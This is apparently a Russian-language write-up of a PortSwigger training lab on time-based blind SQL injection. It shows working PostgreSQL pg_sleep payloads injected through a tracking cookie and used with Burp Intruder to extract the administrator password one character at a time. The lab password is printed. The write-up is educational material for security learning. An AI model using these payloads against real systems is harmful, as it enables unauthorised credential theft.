---
title: "Blind SQL injection with time delays and information retrieval"
date: 2025-06-13
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-time-delays/sql-injection/blind/lab-time-delays-info-retrieval"
classes: wide
---

В данной лабе есть уязвимый к **Time blind based SQL injection**. В БД есть таблицы с именам `users` и колонками `username` и `password`. Нужно получить информацию из БД, чтобы зайти в аккаунт `administrator`.


```
https://0a9b002a03f6156ee5dd4c68003a0047.web-security-academy.net/
```


## Solution

**Time blind based SQL injection** означает, что у нас нет отображения ошибок и другой информации из БД. Для осуществления такой инъекции необходимо отслеживать изменения времени при отправке запросов.

В данной лабе есть подсказка, что уязвимость находится в `Cookies`. Поэтому посмотрю на содержимое `HTTP`-запроса:

```http
GET / HTTP/2
Host: 0a9b002a03f6156ee5dd4c68003a0047.web-security-academy.net
Cookie: TrackingId=1dcxlzC6I5A65xtx; session=iP7BLvBRbkoKbXESrV5ui6fMOoyzhqpl
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a9b002a03f6156ee5dd4c68003a0047.web-security-academy.net/filter?category=Pets
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

Скорее всего уязвимость находится в `TrackingId`. Поэтому попробую подобрать обрамление для запроса. Но у нас не будет никаких изменений на странице, так как это **blind time based**. Для отображения результата нужно использовать функции `sleep()` и обращать внимание на время ответа:

```
TrackingId=1dcxlzC6I5A65xtx' and SELECT sleep(10)-- -Ok
TrackingId=1dcxlzC6I5A65xtx' and WAITFOR DELAY '0:0:10'-- -Ok
rackingId=1dcxlzC6I5A65xtx' and SELECT pg_sleep(10)-- -ok
rackingId=1dcxlzC6I5A65xtx' and dbms_pipe.receive_message(('a'),10)-- -Ok
TrackingId=1dcxlzC6I5A65xtx'; SELECT sleep(10)-- -Ok
TrackingId=1dcxlzC6I5A65xtx'; WAITFOR DELAY '0:0:10'-- -Ok
rackingId=1dcxlzC6I5A65xtx'; SELECT pg_sleep(10)-- -delay
```

Наконец получилось найти нужный пейлод. Использую `CASE`, чтобы найти длину пароля:

```
rackingId=1dcxlzC6I5A65xtx'; SELECT CASE WHEN LENGTH(password) = 20 THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE username = 'admninistrator'-- -delay
```

Значит искомый пароль имеет длину 20. Для его получения буду вытаскивать символ за символом с помощью `SUBSTR`:

```
rackingId=1dcxlzC6I5A65xtx'; SELECT CASE WHEN SUBSTR(password,1,1) = 'a' THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE username = 'administrator'-- -
```

Запросы буду делать с помощью атаки `Brute Force` в `Intruder`. Нужный символ можно будет найти по большому времени ответа:


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_Blind_SQL_injection_with_time_delays_and_information_retrieval/2.png){: height="200" .align-center}


Пароль подобран: `9zyi3emsavu9x3h6q29h`. Проверю:


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_Blind_SQL_injection_with_time_delays_and_information_retrieval/1.png){: height="200" .align-center}


Что же может быть лучше слепых `SQL` инъекций? Конечно же слепые инъекции на задержки по времени) ☕
